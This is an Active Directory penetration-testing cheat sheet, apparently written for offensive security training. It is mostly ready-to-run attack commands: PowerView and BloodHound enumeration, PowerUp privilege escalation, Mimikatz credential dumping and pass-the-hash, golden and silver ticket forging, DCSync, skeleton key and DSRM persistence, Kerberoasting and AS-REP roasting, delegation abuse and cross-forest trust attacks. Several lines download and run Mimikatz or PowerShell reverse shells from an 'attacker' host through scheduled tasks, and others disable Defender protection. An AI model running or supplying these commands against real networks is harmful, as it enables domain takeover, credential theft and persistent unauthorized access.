# Active Directory Cheat Sheet

## General Process
- Recon
- Domain Enum
- Local Privilege Escalation
- Local Account Stealing
- Monitor Potential Incomming Account
- Local Account Stealing
- Admin Recon
- Lateral Mouvement
- Remote Administration
- Domain Admin Privileges
- Cross Trust Attacks
- Persistance and Exfiltrate

### Users,Computer,Domain Admins, Enterprise Administrators, Shares
Tool : PowerView
> . .\PowerView.ps1
Import-Module PowerView.ps1

- Enumerate Users
```Powershell
Get-NetUser
Get-NetUser | select -ExpandProperty samaccountname
```

- Enumerate Computers
```Powershell
Get-NetComputer
```

- Enumerate Domain Administrators
```Powershell
Get-NetGroup -GroupName "Domain Admins" -FullData
Get-NetGroupMember -GroupName "Domain Admins"
```

- Enumerate Enterprise Administrators
```Powershell
Get-NetGroupMember -GroupName "Enterprise Admins"
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain target.local
```

- Enumerate Interesting Shares
```Powershell
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
```

### OU, Computer in target OU, GPO, GPO on target OU
Tool : PowerView
> . .\PowerView.ps1
Import-Module PowerView.ps1

- Enumerate Restricted Groups from GPO
```Powershell
Get-NetGPOGroup -Verbose
```

- Membership of the Group "RDPUsers”
```Powershell
Get-NetGroupMember -GroupName RDPUsers
```

- List all the computers in the target OU
```powershell
Get-NetOU targetcomputer | %{Get-NetComputer -ADSPath $_}
```

- List GPOs
```powershell
Get-NetGPO
```
- GPO applied on the target OU
```powershell
(Get-NetOU targetmachine -FullData).gplink[LDAP://cn={x-x-x-x-x},cn=policies,cn=system,DC=target,DC=domain,DC=local;0]
Get-NetGPO -ADSpath 'LDAP://cn={x-x-x-x-x},cn=policies,cn=system,DC=target,DC=domain,DC=local'
```

### ACL for a Users group, ACL for Domain Admins group, right/permissions for target user
Tool : PowerView
> . .\PowerView.ps1
Import-Module PowerView.ps1

- Enumerate ACLs
```powershell
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
```

- Enumerate ACLs for all the GPOs
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```

- Enumerate GPOs where target user or group have interesting permissions
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ?{$_.IdentityReference -match "target"}
```

- Check for modify rights/permissions for the target
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "target"}
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "targetgroup"}
```

### Domain, trust, external trust
Tool : PowerView
> . .\PowerView.ps1
Import-Module PowerView.ps1

- All domains
```powershell
Get-NetForestDomain -Verbose
```
- Map the trusts
```powershell
Get-NetDomainTrust
```

- Map all the trusts of the domain.local forest
```powershell
Get-NetForestDomain -Verbose | Get-NetDomainTrust
```

- List external trusts
```powershell
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
```
if Bi-Directional trust we can extract information


### Basic Privilege escalation, check access with new account
Tool : PowerView / PowerUp / Find-PSRemotingLocalAdminAccess

- Basic Privilege escalation with PowerUp
```powershell
1. Service Enumeration
Get-ServiceUnquoted                 #   returns services with unquoted paths that also have a space in the name
Get-ModifiableServiceFile           #   returns services where the current user can write to the service binary path or its config
Get-ModifiableService               #   returns services the current user can modify
Get-ServiceDetail                   #   returns detailed information about a specified service

2. Service Abuse
Invoke-ServiceAbuse                 #   modifies a vulnerable service to create a local admin or execute a custom command
Write-ServiceBinary                 #   writes out a patched C # service binary that adds a local admin or executes a custom command
Install-ServiceBinary               #   replaces a service binary with one that adds a local admin or executes a custom command
Restore-ServiceBinary               #   restores a replaced service binary with the original executable

3. DLL Hijacking
Find-ProcessDLLHijack               #   finds potential DLL hijacking opportunities for currently running processes
Find-PathDLLHijack                  #   finds service %PATH% DLL hijacking opportunities
Write-HijackDll                     #   writes out a hijackable DLL

4. Registry Checks
Get-RegistryAlwaysInstallElevated   #  checks if the AlwaysInstallElevated registry key is set
Get-RegistryAutoLogon               #   checks for Autologon credentials in the registry
Get-ModifiableRegistryAutoRun       #   checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns

5. Miscellaneous Checks
Get-ModifiableScheduledTaskFile     #   find schtasks with modifiable target files
Get-UnattendedInstallFile           #   finds remaining unattended installation files
Get-Webconfig                       #   checks for any encrypted web.config strings
Get-ApplicationHost                 #   checks for encrypted application pool and virtual directory passwords
Get-SiteListPassword                #   retrieves the plaintext passwords for any found McAfee`'s SiteList.xml files
Get-CachedGPPPassword               #   checks for passwords in cached Group Policy Preferences files

6. Other Helpers/Meta-Functions
Get-ModifiablePath                  #   tokenizes an input string and returns the files in it the current user can modify
Get-CurrentUserTokenGroupSid        #   returns all SIDs that the current user is a part of, whether they are disabled or not
Add-ServiceDacl                     #   adds a Dacl field to a service object returned by Get-Service
Set-ServiceBinPath                  #   sets the binary path for a service to a specified value through Win32 API methods
Test-ServiceDaclPermission          #   tests one or more passed services or service names against a given permission set
Write-UserAddMSI                    #   write out a MSI installer that prompts for a user to be added

7. Check ALL
Invoke-AllChecks                    #   runs all current escalation checks and returns a report
```

- Local Administrative access hunting
```powershell
Find-LocalAdminAccess -Verbose
```

- Local Administrative access hunting
```powershell
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
# No Stateful
Enter-PSSession -ComputerName targetcomputer.target.domain.local
# Stateful
$sess = New-Pssession -ComputerName targetcomputer.target.domain.local
Enter-Pssession -session $sess
```

### Setup BloodHound and Ingestor (kali)
Tool : neo4j / Sharphound / powercat

- Bloodhound use neo4j database
```bash
# term1
neo4j console
# term2
bloodhound
```
- BloodHound ingestores to gather data and information
```powershell
Import-Module .\SharpHound.ps1
# Actual session
Invoke-BloodHound -CollectionMethod All -Verbose
# Actual session with more options
Invoke-Bloodhound -Verbose -Domain 'domain.local' -DomainController '172.16.0.1' -CollectionMethod all
# With Credential
Invoke-Bloodhound -Verbose -Domain 'domain.local' -DomainController 'DC01.domain.local' -LDAPUser 'targetuser' -LDAPPass 'targetpass' -CollectionMethod  all

# transfert your ZIP
```

### Account Hunting
Tool : PowerView

- User Hunting
```powershell
Invoke-UserHunter # take long time to check all the machines in the domain
Invoke-UserHunter -CheckAccess
```


### Invoke Module in Memory
Too : Powershell / Mimicatz

- Download and execute Mimikatz
```powershell
iex (iwr http://attacker/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

### Remote Administration
Tool : Powershell

- Remote commande
```powershell
Invoke-Command -ScriptBlock {whoami /priv;hostname} -ComputerName targetcomputer.domain.local

$sess = New-Pssession -ComputerName targetcomputer.domain.local
Invoke-Command -ScriptBlock {whoami /priv;hostname} -session $sess
```

- Disable AMSI (admin privilege)
```powershell
$sess = New-PSSession -ComputerName targetcomputer.domain.local
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

### Enumerate the Applocker Policy
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Run Powershell with NTLM hash of domain user
Tool : Mimikatz

- Invoke Mimikatz to create a token from user
```powershell
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"sekurlsa::pth /user:targetaccount /domain:domain.local /ntlm:00000000000000000000000000000000 /run:powershell.exe"'
```

### Remote Mimikatz
Tool : Mimikatz

- Invoke Mimikatz to create a token from user
```powershell
$sess = New-PSSession -ComputerName target.domain.local
Enter-PSSession $sess
# EP BYPASS + AMSI BYPASS
exit
# PUSH LOCAL SCRIPT TO SESSION
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession $sess
# DUMPING
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

### GOLDEN TICKET
Tool : Mimikatz

- Generate Golden ticket with KRBTGT Hash
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:target.local /sid:S-1-5-x-x-x-x /krbtgt:00000000000000000000000000000000:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

- Check access
```powershell
ls \\DC01\c$
gwmi -Class win32_computersystem -ComputerName DC01.target.local

```

### SILVER TICKET
Tool : Mimikatz - hash of machine account

- Generate Silver ticket with machine account Hash - Task abuse
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:target.local /sid:S-1-5-x-x-x-x /target:machine.target.local /service:HOST/rc4:00000000000000000000000000000000 /user:Administrator /ptt"'
```
:information_source: Execute a task to run the reverse shell script
```powershell
schtasks /create /S machine.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "taskname" /TR "powershell.exe -c 'iex(New-Object Net.WebClient).DownloadString(''http://attackerip/Invoke-PowerShellTcp.ps1''')'"
schtasks /Run /S machine.domain.local /TN "taskname"
```

- Generate Silver ticket with machine account Hash - WMI abuse
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:target.local /sid:S-1-5-x-x-x-x /target:machine.target.local /service:HOST/rc4:00000000000000000000000000000000 /user:Administrator /ptt"'
Invoke-Mimikatz -Command '"kerberos::golden /domain:target.local /sid:S-1-5-x-x-x-x /target:machine.target.local /service:RPCSS/rc4:00000000000000000000000000000000 /user:Administrator /ptt"'
```
:information_source: Check WMI
```powershell
Get-WmiObject -Class win32_operatingsystem -ComputerName machine.target.local
```

## Usefull Object Permission

| Rights | Permission |
|---|---|
| GenericAll  | Full rights to the object (add users to a group or reset user's password)  |
| GenericWrite  | Update object's attributes (i.e logon script)  |
| WriteOwner  | Change object owner to attacker controlled user take over the object  |
| WriteDACL  | Modify object's ACEs and give attacker full control right over the object  |
| AllExtendedRights  | Ability to add user to a group or reset password  |
| ForceChangePassword  | Ability to change user's password  |
| Self (Self-Membership)  | Ability to add yourself to a group |

## Check Replication Rights, Modifiy, Execute The DCSync Attack
```powershell
# CHECK
. .\PowerView.ps1
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "targetuser") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}

# ADD OBJECT ACL
Add-ObjectAcl -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName targetuser -Rights DCSync -Verbose

# DCSYNC
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "targetuser") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```


## Domain Attack and Persistance

### Skeleton Key Attack
```powershell
$sess = New-PSSession DC01.domain.local
Enter-PSSession -Session $sess
# BYPASS AMSI AND EXIT
Invoke-Command -FilePath C:\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```
:information_source: Only available with DA privilege until DC in not restarted. Can log on to any machine as any user unless the DC is restarted (use mimikatz as password).

:no_entry: Only one time, dont forget to reboot the DC to restore.

### Directory Services Restore Mode
```powershell
$sess = New-PSSession DC01.domain.local
Enter-PSSession -Session $sess
# BYPASS AMSI AND EXIT
Invoke-Command -FilePath C:\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# ALLOW DSRM ADMINISTRATOR TO LOGIN
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# PASS THE HASH DSRM ADMINISTRATOR
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:00000000000000000000000000000000 /run:powershell.exe"'
```
:information_source: DSRM is a local administrator on DC

### Modify Security Descriptors For Remote Commande Execution (WMI/PSREMOTE)
```powershell
# V1
. .\Set-RemoteWMI.ps1
Set-RemoteWMI -UserName targetuser -ComputerName DC01.domain.local -namespace 'root\cimv2' -Verbose

gwmi -class win32_operatingsystem -ComputerName DC01.domain.local

# V2
. .\Set-RemotePSRemoting.ps1
Set-RemotePSRemoting -UserName targetuser -ComputerName DC01.domain.local -Verbose
Invoke-Command -ScriptBlock{whoami} -ComputerName DC01.domain.local
```

### Retrieve Machine Account Hash Without DA
```powershell
# MODIFY PERMISSIONS
. .\DAMP-master\Add-RemoteRegBackdoor.ps1
Add-RemoteRegBackdoor -ComputerName DC01.domain.local -Trustee myactualuser -Verbose
# REQUEST HASH AS TRUSTED USER
Get-RemoteMachineAccountHash -ComputerName DC01.domain.local -Verbose

. .\DAMP-master\RemoteHashRetrieval.ps1
Get-RemoteMachineAccountHash -ComputerName DC01.domain.local -Verbose

# CREATE SILVER TICKET HOST & RPCSS WITH MACHINE ACCOUNT HASH FOR WMI QUERYES
Invoke-Mimikatz -Command '"kerberos::golden /domain:domain.local /sid:S-1-5-x-x-x-x /target:DC01.domain.local /service:HOST/rc4:00000000000000000000000000000000 /user:Administrator /ptt"'
Invoke-Mimikatz -Command '"kerberos::golden /domain:domain.local /sid:S-1-5-x-x-x-x /target:DC01.domain.local /service:RPCSS/rc4:00000000000000000000000000000000 /user:Administrator /ptt"'

gwmi -class win32_operatingsystem -ComputerName DC01.domain.local
```

### Kerberoast Attack
```powershell
. .\PowerView.ps1
Get-NetUser -SPN # CHECK serviceprincipalname
# REQUEST A TICKET
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "VALUABLESPN/TARGETSRV.domain.local"
klist
# DUMP TICKETS
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
Export .kirbi for local cracking

```Powershell
python.exe .\tgsrepcrack.py .\password.list .\xxx.kirbi
```

### Kerberos Preauth Disabled
:heavy_exclamation_mark: PowerView_dev
```powershell
. .\PowerView_dev.ps1
# SEARCH USERS WITH KERBEROS PREAUTH DISABLED
Get-DomainUser -PreauthNotRequired -Verbose

. .\ASREPRoast\ASREPRoast.ps1
# REQUEST CRACKABLE ENCRYPTED PART
Get-ASREPHash -UserName targetuser -Verbose
```

Check if you can crack with john
```bash
$krb5asrep$targetuser@domain.local:13d55a1f0b1aa3c39a3c5a6815f40ee3$ee68bfe89b0fd40326189cf255a148957bd1d2900cce75fb3f3db56c4086e2d207641a1f5744fd9505ba39d0238b6828b6311eb049d6ee82e8d1deac23f61e252
ef6aaa7997a3445334280178bb5483f445a0e5156512f9421edfdd2b2dc04a3dddf951c90fbe647f01dd7f14a97a89ab96f89e3acc3cdfd113fa214fe10ee53cc47e99929e9358ba215cd161855d8945e7b2e9dacd4e16a77d53fbaedbb486dfb5a4726ed1d3f395618
6d1dbbe33b9fe6cd1d19e0993193cebd1f80c3fdfb2265fe7a6b6690d488400a80f272650a4a89dd84a1ce17651c103ae498226ab569e953998e4f1823e18632ede548a4c38923a5cb5ed6d1c49f5edf475f0f5690617dee6f898dfcd52e
john targetuser.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Check if you can crack with hashcat, need add $23 
```bash
$krb5asrep$23$targetuser@domain.local:13d55a1f0b1aa3c39a3c5a6815f40ee3$ee68bfe89b0fd40326189cf255a148957bd1d2900cce75fb3f3db56c4086e2d207641a1f5744fd9505ba39d0238b6828b6311eb049d6ee82e8d1deac23f61e252
ef6aaa7997a3445334280178bb5483f445a0e5156512f9421edfdd2b2dc04a3dddf951c90fbe647f01dd7f14a97a89ab96f89e3acc3cdfd113fa214fe10ee53cc47e99929e9358ba215cd161855d8945e7b2e9dacd4e16a77d53fbaedbb486dfb5a4726ed1d3f395618
6d1dbbe33b9fe6cd1d19e0993193cebd1f80c3fdfb2265fe7a6b6690d488400a80f272650a4a89dd84a1ce17651c103ae498226ab569e953998e4f1823e18632ede548a4c38923a5cb5ed6d1c49f5edf475f0f5690617dee6f898dfcd52e
hashcat -m 18200 targetuser.txt /usr/share/wordlists/rockyou.txt -o cracked
```

Check if your targetuser can control something
```powershell
. .\PowerView_dev.ps1
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "targetgroup"}
```

If yes, force set preauth not requierd to targeted control
```powershell
. .\PowerView_dev.ps1
Set-DomainObject -Identity controleduser -XOR @{useraccountcontrol=4194304} -Verbose
Get-DomainUser -PreauthNotRequired -Identity controleduser
```
You can view and edit these attributes by using either the Ldp.exe tool or the Adsiedit.msc snap-in.

The following table lists possible flags that you can assign. You cannot set some of the values on a user or computer object because these values can be set or reset only by the directory service. Note that Ldp.exe shows the values in hexadecimal. Adsiedit.msc displays the values in decimal. The flags are cumulative. To disable a user's account, set the UserAccountControl attribute to 0x0202 (0x002 + 0x0200). In decimal, this is 514 (2 + 512).

Note You can directly edit Active Directory in both Ldp.exe and Adsiedit.msc. Only experienced administrators should use these tools to edit Active Directory. Both tools are available after you install the Support tools from your original Windows installation media. 
| Property flag 	| Value in hexadecimal 	| Value in decimal 	|
|---	|---	|---	|
| SCRIPT<br>The logon script will be run. 	| 0x0001 	| 1
| ACCOUNTDISABLE<br>The user account is disabled. 	| 0x0002 	| 2
| HOMEDIR_REQUIRED<br>The home folder is required. 	| 0x0008 	| 8
| LOCKOUT 	| 0x0010 	| 16
| PASSWD_NOTREQD<br>No password is required. 	| 0x0020 	| 32
| PASSWD_CANT_CHANGE<br>The user cannot change the password. This is a permission on the user's object. 	| 0x0040 	| 64
| ENCRYPTED_TEXT_PWD_ALLOWED<br>The user can send an encrypted password. 	| 0x0080 	| 128
| TEMP_DUPLICATE_ACCOUNT<br>This is an account for users whose primary account is in another domain. This account provides user access to this domain, but not to any domain that trusts this domain. This is sometimes referred to as a local user account. 	| 0x0100 	| 256
| NORMAL_ACCOUNT<br>This is a default account type that represents a typical user. 	| 0x0200 	| 512
| INTERDOMAIN_TRUST_ACCOUNT<br>This is a permit to trust an account for a system domain that trusts other domains. 	| 0x0800 	| 2048
| WORKSTATION_TRUST_ACCOUNT<br>This is a computer account for a computer that is running Microsoft Windows NT 4.0 Workstation, Microsoft Windows NT 4.0 Server, Microsoft Windows 2000 Professional, or Windows 2000 Server and is a member of this domain. 	| 0x1000 	| 4096
| SERVER_TRUST_ACCOUNT<br>This is a computer account for a domain controller that is a member of this domain. 	| 0x2000 	| 8192
| DONT_EXPIRE_PASSWORD<br>Represents the password, which should never expire on the account. 	| 0x10000 	| 65536
| MNS_LOGON_ACCOUNT<br>This is an MNS logon account. 	| 0x20000 	| 131072
| SMARTCARD_REQUIRED<br>When this flag is set, it forces the user to log on by using a smart card. 	| 0x40000 	| 262144
| TRUSTED_FOR_DELEGATION<br>When this flag is set, the service account (the user or computer account) under which a service runs is trusted for Kerberos delegation. Any such service can impersonate a client requesting the service. To enable a service for Kerberos delegation, you must set this flag on the userAccountControl property of the service account. 	| 0x80000 	| 524288
| NOT_DELEGATED<br>When this flag is set, the security context of the user is not delegated to a service even if the service account is set as trusted for Kerberos delegation. 	| 0x100000 	| 1048576
| USE_DES_KEY_ONLY<br>(Windows 2000/Windows Server 2003) Restrict this principal to use only Data Encryption Standard (DES) encryption types for keys. 	| 0x200000 	| 2097152
| DONT_REQ_PREAUTH<br>(Windows 2000/Windows Server 2003) This account does not require Kerberos pre-authentication for logging on. 	| 0x400000 	| 4194304
| PASSWORD_EXPIRED<br>(Windows 2000/Windows Server 2003) The user's password has expired. 	| 0x800000 	| 8388608
| TRUSTED_TO_AUTH_FOR_DELEGATION<br>(Windows 2000/Windows Server 2003) The account is enabled for delegation. This is a security-sensitive setting. Accounts that have this option enabled should be tightly controlled. This setting lets a service that runs under the account assume a client's identity and authenticate as that user to other remote servers on the network.  	| 0x1000000 	| 16777216
| PARTIAL_SECRETS_ACCOUNT<br>(Windows Server 2008/Windows Server 2008 R2) The account is a read-only domain controller (RODC). This is a security-sensitive setting. Removing this setting from an RODC compromises security on that server. 	| 0x04000000  	| 67108864

These are the default UserAccountControl values for the certain objects:
* Typical user : 0x200 (512)
* Domain controller : 0x82000 (532480)
* Workstation/server: 0x1000 (4096)

Get-ASREPHash from ASREPRoast to request the crackable encrypted part, as done earlier
```powershell
. .\ASREPRoast\ASREPRoast.ps1
Get-ASREPHash -UserName controleduser -Verbose
```

### SET SPN ON TARGET USER AND OBTAIN A TGS
```powershell
. .\PowerView_dev.ps1
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
Get-DomainUser -Identity targetuser | select serviceprincipalname
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "domain/whateverX"
klist
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'

python.exe .\tgsrepcrack.py .\password.list .\x-xxxxxxxx-targetuser@domain/whateverX-domain.local.kirbi

# ALTERNATIVE
Get-DomainUser -Identity targetuser | Get-DomainSPNTicket | select -ExpandProperty Hash
```

### CHECK SERVER THAT HAS UNCONSTRAINED DELEGATION ENABLED / USER HUNTING
Tool : PowerView, Find-PSRemotingLocalAdminAccess,Find-PSRemotingLocalAdminAccess,Mimikatz

```powershell
Get-NetComputer -Unconstrained | select -ExpandProperty name
. .\PowerView.ps1
Find-LocalAdminAccess
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
Invoke-UserHunter -ComputerName targetserver -Poll 100 -UserName Administrator -Delay 5 -Verbose
# WAIT FOR TOKEN ...
# ADMINISTRATOR INCOMING
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
# REUSE TICKET WITH ADMIN PRIV
Invoke-Mimikatz -Command '"kerberos::ptt C:\exportpath\Administrator@krbtgt-DOMAIN.LOCAL.kirbi"'
Invoke-Command -ScriptBlock{whoami;hostname} -computername DC01
```
### CHECK USERS WHOM CONSTRAINED DELEGATION IS ENABLED 
Tool : PowerView_dev, kekeo

```powershell
. .\PowerView_dev.ps1
Get-DomainUser -TrustedToAuth
# CHECK cn, msds-allowedtodelegateto, useraccountcontrol
# USE tgt::ask module + HASH
.\kekeo.exe
tgt::ask /user:target /domain:domain.local /rc4:00000000000000000000000000000000
# USE TGT AND REQUEST TGS
tgs::s4u /tgt:ticket@domain.local.kirbi /user:Administrator@domain.local /service:cifs/DC01.domain.local
# INJECT TICKET IN MEMORY
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@domain.local@DOMAIN.LOCAL_cifs~DC01.domain.LOCAL@DOMAIN.LOCAL.kirbi"'
ls \\DC01.domain.local\c$
```
### CHECK COMPUTER ACCOUNTS WITCH CONTRAINED DELEGATION IS ENABLED

```powershell
Get-DomainComputer -TrustedToAuth.
# CHECK cn, msds-allowedtodelegateto, useraccountcontrol
.\kekeo.exe
tgt::ask /user:targetmachine$ /domain:domain.local /rc4:00000000000000000000000000000000
# COULD ASK MULTIPLE SERVICE |
tgs::s4u /tgt:ticket@domain.local.kirbi /user:Administrator@domain.local /service:time/DC01.domain.local|ldap/DC01.domain.local
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@domain.local@DOMAIN.LOCAL_cifs~DC01.domain.LOCAL@DOMAIN.LOCAL.kirbi"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\krbtgt"'
```

### DA TO EA - Domain Trust Key
```powershell
$sess = New-PSSession -ComputerName DC01.domain.local
Enter-PSSession -Session $sess
# EP + AMSI BYPASS + EXIT
Invoke-Command -FilePath C:\path\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```
Create the inter-realm TGT

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-x-x-x-x-x /sids:S-1-5-x-x-x-x-519 /rc4:00000000000000000000000000000000 /service:krbtgt /target:domain.local /ticket:C:\path\trust_tkt.kirbi"'
```

Create the TGS for service in parent domain
```powershell
.\asktgs.exe C:\path\trust_tkt.kirbi CIFS/DC01.domain.local
.\kirbikator.exe lsa .\CIFS.DC01.domain.local.kirbi
```

### DA TO EA - KRBTGT Hash
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-x-x-x-x /sids:S-1-5-x-x-x-x-519 /krbtgt:00000000000000000000000000000000 /ticket:C:\path\krbtgt_tkt.kirbi"'
Invoke-Mimikatz -Command '"kerberos::ptt C:\path\krbtgt_tkt.kirbi"'
schtasks /create /S DC01.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "taskname" /TR "powershell.exe -c 'iex (New-ObjectNet.WebClient).DownloadString(''http://attacker/Invoke-PowerShellTcpEx.ps1''')'"
# SET UP YOU LISTENER
schtasks /Run /S DC01.domain.local /TN "taskname"
```

### Acces Share test.domain.local to domain2.local forest
```powershell
# KEYS
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
# TGT
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:test.domain.local /sid:S-1-5-x-x-x-x /rc4:00000000000000000000000000000000 /service:krbtgt /domain.local /ticket:C:\path\trust_forest_tkt.kirbi"'
# TGS for a service (CIFS)
.\asktgs.exe C:\path\trust_forest_tkt.kirbi CIFS/DC01.domain2.local
# Present the TGS to the service (CIFS)
.\kirbikator.exe lsa .\CIFS.DC01.domain2.local.kirbi

```

:information_source: Well-known security identifiers. (S-1-5-21domain)
| Property flag | Value in hexadecimal |
|---|---|
| 500 | Administrator |
| 501 | Guest |
| 502 | KRBTGT |
| 512 | Domain Admins |
| 513 | Domain Users |
| 514 | Domain Guests |
| 515 | Domain Computers |
| 516 | Domain Controllers |
| 517 | Cert Publishers |
| 518 | Schema Admins |
| 519 | Enterprise Admins |
| 520 | Group Policy Creator Owners |
| 526 | Key Admins |
| 527 | Enterprise Key Admins |
| 553 | RAS and IAS Servers |


:construction_worker:
```powershell

```
